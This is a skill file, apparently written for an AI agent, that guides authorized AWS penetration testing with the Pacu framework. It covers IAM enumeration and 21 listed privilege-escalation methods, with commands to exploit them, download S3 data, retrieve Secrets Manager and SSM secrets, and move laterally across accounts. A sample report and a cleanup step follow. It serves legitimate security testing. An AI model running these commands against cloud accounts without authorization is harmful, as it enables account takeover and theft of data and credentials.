@@ -1,0 +1,319 @@
+\title{Performing Cloud Penetration Testing With Pacu}
+
+\taxon{skill}
+
+\tag{cloud-security}
+
+\tag{aws}
+
+\tag{pacu}
+
+\tag{penetration-testing}
+
+\tag{offensive-security}
+
+\tag{iam-exploitation}
+
+\meta{version}{"1.0"}
+
+\meta{description}{Performing authorized AWS penetration testing using Pacu, the open-source AWS exploitation framework, to enumerate IAM configurations, discover privilege escalation paths, test credential harvesting, and validate security controls through systematic attack simulation.}
+
+\subtree{
+\title{Performing Cloud Penetration Testing with Pacu}
+\subtree{
+\title{When to Use}
+\ul{
+\li{When conducting authorized penetration testing of AWS environments}
+\li{When validating the effectiveness of IAM policies, SCPs, and permission boundaries}
+\li{When assessing the blast radius of a compromised set of AWS credentials}
+\li{When testing detection capabilities of GuardDuty, Security Hub, and custom alerting}
+\li{When building red team exercises against AWS cloud infrastructure}
+}
+
+\p{\strong{Do not use} for unauthorized testing of any AWS account, for testing AWS infrastructure itself (covered by shared responsibility), for DDoS or volumetric attacks without AWS approval, or for production account testing without explicit authorization and breakglass procedures.}
+}
+
+\subtree{
+\title{Prerequisites}
+\ul{
+\li{Written authorization from the AWS account owner with defined scope and rules of engagement}
+\li{Pacu v1.5+ installed (\code{\startverb pip install pacu\stopverb})}
+\li{Test AWS credentials with limited starting permissions (simulates compromised credential scenario)}
+\li{CloudTrail logging enabled to capture all Pacu activity for post-engagement review}
+\li{GuardDuty enabled to validate detection of Pacu activities}
+\li{Emergency contact and rollback procedures documented}
+}
+}
+
+\subtree{
+\title{Workflow}
+\subtree{
+\title{Step 1: Initialize Pacu Session and Configure Credentials}
+\p{Set up a Pacu session with the test credentials and define the engagement scope.}
+
+\pre{\startverb
+# Install Pacu
+pip install pacu
+
+# Start Pacu
+pacu
+
+# Create a new session for the engagement
+Pacu > set_keys --key-alias pentest-target
+# Enter Access Key ID: AKIA...
+# Enter Secret Access Key: ...
+
+# Verify identity
+Pacu > whoami
+
+# Review available modules
+Pacu > list
+Pacu > search iam
+Pacu > search ec2
+Pacu > search s3
+\stopverb}
+}
+
+\subtree{
+\title{Step 2: Enumerate IAM Configuration}
+\p{Run IAM enumeration modules to map users, roles, policies, and group memberships.}
+
+\pre{\startverb
+# Comprehensive IAM enumeration
+Pacu > run iam__enum_users_roles_policies_groups
+
+# Enumerate detailed permissions for the current principal
+Pacu > run iam__enum_permissions
+
+# Enumerate account authorization details (requires iam:GetAccountAuthorizationDetails)
+Pacu > run iam__get_credential_report
+
+# Enumerate role trust policies for cross-account access
+Pacu > run iam__enum_roles
+
+# Check current session data
+Pacu > data iam
+\stopverb}
+}
+
+\subtree{
+\title{Step 3: Scan for Privilege Escalation Paths}
+\p{Use Pacu's privilege escalation scanner to identify all exploitable escalation vectors.}
+
+\pre{\startverb
+# Run the privilege escalation scanner
+Pacu > run iam__privesc_scan
+
+# The scanner tests for 21+ escalation methods:
+# Method 1:  iam:CreatePolicyVersion
+# Method 2:  iam:SetDefaultPolicyVersion
+# Method 3:  iam:PassRole + ec2:RunInstances
+# Method 4:  iam:PassRole + lambda:CreateFunction + lambda:InvokeFunction
+# Method 5:  iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping
+# Method 6:  iam:PassRole + glue:CreateDevEndpoint
+# Method 7:  iam:PassRole + cloudformation:CreateStack
+# Method 8:  iam:PassRole + datapipeline:CreatePipeline
+# Method 9:  iam:CreateAccessKey
+# Method 10: iam:CreateLoginProfile
+# Method 11: iam:UpdateLoginProfile
+# Method 12: iam:AttachUserPolicy
+# Method 13: iam:AttachGroupPolicy
+# Method 14: iam:AttachRolePolicy
+# Method 15: iam:PutUserPolicy
+# Method 16: iam:PutGroupPolicy
+# Method 17: iam:PutRolePolicy
+# Method 18: iam:AddUserToGroup
+# Method 19: iam:UpdateAssumeRolePolicy
+# Method 20: sts:AssumeRole
+# Method 21: lambda:UpdateFunctionCode
+
+# If escalation paths found, attempt exploitation
+Pacu > run iam__privesc_scan --escalate
+\stopverb}
+}
+
+\subtree{
+\title{Step 4: Enumerate and Test Data Access}
+\p{Discover accessible data stores including S3, DynamoDB, RDS, and Secrets Manager.}
+
+\pre{\startverb
+# Enumerate S3 buckets
+Pacu > run s3__bucket_finder
+
+# Download S3 bucket data for analysis
+Pacu > run s3__download_bucket --bucket target-bucket --dl-names
+
+# Enumerate EC2 instances and extract user data
+Pacu > run ec2__enum
+Pacu > run ec2__download_userdata
+
+# Enumerate Lambda functions and check for secrets in environment variables
+Pacu > run lambda__enum
+
+# Enumerate Secrets Manager
+Pacu > run secretsmanager__enum
+
+# Enumerate SSM parameters (often contain secrets)
+Pacu > run ssm__download_parameters
+
+# Check for exposed EBS snapshots
+Pacu > run ebs__enum_snapshots_unauth
+\stopverb}
+}
+
+\subtree{
+\title{Step 5: Test Lateral Movement and Persistence}
+\p{Evaluate cross-account access, service exploitation, and persistence mechanisms.}
+
+\pre{\startverb
+# Test cross-account role assumption
+Pacu > run sts__assume_role --role-arn arn:aws:iam::TARGET:role/CrossAccountRole
+
+# Enumerate Lambda for code execution opportunities
+Pacu > run lambda__enum
+# If lambda:UpdateFunctionCode permission exists, could inject code
+
+# Test EC2 instance connect for lateral movement
+Pacu > run ec2__enum
+# Check for instances with instance profiles that have broader permissions
+
+# Check for CodeBuild projects (potential credential access)
+Pacu > run codebuild__enum
+
+# Enumerate ECS/Fargate for container-based lateral movement
+Pacu > run ecs__enum
+
+# Export all discovered data
+Pacu > data all
+\stopverb}
+}
+
+\subtree{
+\title{Step 6: Validate Detection and Generate Report}
+\p{Review whether security controls detected the testing activities and compile findings.}
+
+\pre{\startverb
+# Check GuardDuty findings generated during testing
+aws guardduty list-findings \
+  --detector-id $(aws guardduty list-detectors --query 'DetectorIds[0]' --output text) \
+  --finding-criteria '{
+    "Criterion": {
+      "updatedAt": {"GreaterThanOrEqual": ENGAGEMENT_START_EPOCH}
+    }
+  }' --output json
+
+# Check Security Hub findings
+aws securityhub get-findings \
+  --filters '{
+    "CreatedAt": [{"Start": "ENGAGEMENT_START_ISO", "End": "ENGAGEMENT_END_ISO"}]
+  }'
+
+# Export Pacu session data for reporting
+Pacu > export_keys --all
+Pacu > data all > pacu-session-export.json
+
+# Clean up any test artifacts created during assessment
+aws iam delete-user --user-name pacu-test-user 2>/dev/null
+aws iam delete-access-key --user-name pacu-test-user --access-key-id AKIA... 2>/dev/null
+\stopverb}
+}
+}
+
+\subtree{
+\title{Key Concepts}
+\pre{\startverb
+| Term | Definition |
+|------|------------|
+| Pacu | Open-source AWS exploitation framework maintained by Rhino Security Labs, providing modular attack capabilities for authorized penetration testing |
+| Privilege Escalation Scan | Automated analysis of IAM policies to identify known methods for elevating permissions from limited access to administrative control |
+| iam:PassRole | Critical IAM action allowing a principal to assign roles to AWS services, enabling indirect privilege escalation through Lambda, EC2, or Glue |
+| Cross-Account Role Assumption | Using sts:AssumeRole to obtain temporary credentials in another AWS account through trust policy configurations |
+| Rules of Engagement | Documented agreement defining the scope, methods, timing, and boundaries of a penetration testing engagement |
+| Post-Exploitation | Activities performed after initial access to demonstrate impact, including data access, lateral movement, and persistence establishment |
+\stopverb}
+}
+
+\subtree{
+\title{Tools & Systems}
+\ul{
+\li{\strong{Pacu}: AWS exploitation framework with 50+ modules for enumeration, escalation, persistence, and data exfiltration}
+\li{\strong{CloudFox}: AWS enumeration tool for identifying attack paths from an attacker perspective}
+\li{\strong{Principal Mapper}: IAM privilege escalation graph analysis tool for visualizing escalation paths}
+\li{\strong{ScoutSuite}: Multi-cloud security assessment tool for identifying misconfigurations before testing}
+\li{\strong{AWS CloudTrail}: Audit logging for capturing all Pacu activities during the engagement}
+}
+}
+
+\subtree{
+\title{Common Scenarios}
+\subtree{
+\title{Scenario: Red Team Assessment Starting from Compromised Developer Credentials}
+\p{\strong{Context}: A red team exercise simulates a scenario where an attacker obtains a developer's AWS access key from a leaked repository. The goal is to determine the maximum impact achievable from this starting point.}
+
+\p{\strong{Approach}:}
+
+\ol{
+\li{Initialize Pacu with the compromised credentials and run \code{\startverb whoami\stopverb} to confirm identity}
+\li{Run \code{\startverb iam__enum_permissions\stopverb} to map the developer's effective permissions}
+\li{Execute \code{\startverb iam__privesc_scan\stopverb} to identify escalation paths from developer to admin}
+\li{Discover the developer can call \code{\startverb iam:PassRole\stopverb} + \code{\startverb lambda:CreateFunction\stopverb}, creating a Lambda with an admin role}
+\li{Exploit the escalation to obtain admin-level temporary credentials}
+\li{Enumerate S3 buckets, download sensitive data, and access Secrets Manager}
+\li{Verify whether GuardDuty detected the escalation and data access activities}
+\li{Clean up all test artifacts and document the complete attack chain}
+}
+
+\p{\strong{Pitfalls}: Pacu modules can be noisy and generate many API calls in a short time. GuardDuty may trigger \code{\startverb Recon:IAMUser/MaliciousIPCaller\stopverb} findings from the tester's IP. Coordinate with the SOC team to whitelist the testing IP or establish a clear communication channel to distinguish testing from real attacks. Always clean up persistence artifacts after testing.}
+}
+}
+
+\subtree{
+\title{Output Format}
+\pre{\startverb
+AWS Penetration Test Report (Pacu)
+=====================================
+Target Account: 123456789012
+Engagement Period: 2026-02-20 to 2026-02-23
+Starting Credentials: Developer role (read-only S3, Lambda invoke)
+Authorization: Signed ROE document #PT-2026-015
+
+ATTACK PATH SUMMARY:
+  Starting access: S3 read-only, Lambda invoke
+  Maximum access achieved: AdministratorAccess (full account compromise)
+  Time to admin: 47 minutes
+  Detection by GuardDuty: Yes (after 12 minutes)
+  Detection by Security Hub: Yes (after 18 minutes)
+  SOC response time: 45 minutes (missed the escalation window)
+
+PACU MODULES EXECUTED:
+  iam__enum_users_roles_policies_groups: SUCCESS
+  iam__enum_permissions: SUCCESS
+  iam__privesc_scan: 3 escalation paths found
+  s3__download_bucket: 4 buckets accessed
+  lambda__enum: 12 functions enumerated
+  secretsmanager__enum: 8 secrets retrieved
+
+ESCALATION PATHS EXPLOITED:
+  [1] iam:PassRole + lambda:CreateFunction -> AdminRole (CRITICAL)
+  [2] sts:AssumeRole -> CrossAccountProdRole (HIGH)
+  [3] iam:CreatePolicyVersion on dev-policy (CRITICAL)
+
+DATA ACCESSED:
+  S3 objects downloaded: 1,247 files (2.3 GB)
+  Secrets Manager values: 8 secrets including DB credentials
+  SSM parameters: 23 parameters including API keys
+
+DETECTION RESULTS:
+  GuardDuty findings generated: 7
+  Security Hub findings: 12
+  Custom CloudWatch alarms triggered: 3
+  SOC acknowledged: Yes (45 min response)
+
+RECOMMENDATIONS:
+  1. Apply permission boundaries to all developer roles
+  2. Remove iam:PassRole from non-admin principals
+  3. Reduce SOC response time to < 15 minutes for IAM escalation alerts
+  4. Implement SCP blocking iam:CreatePolicyVersion in non-admin OUs
+\stopverb}
+}
+}
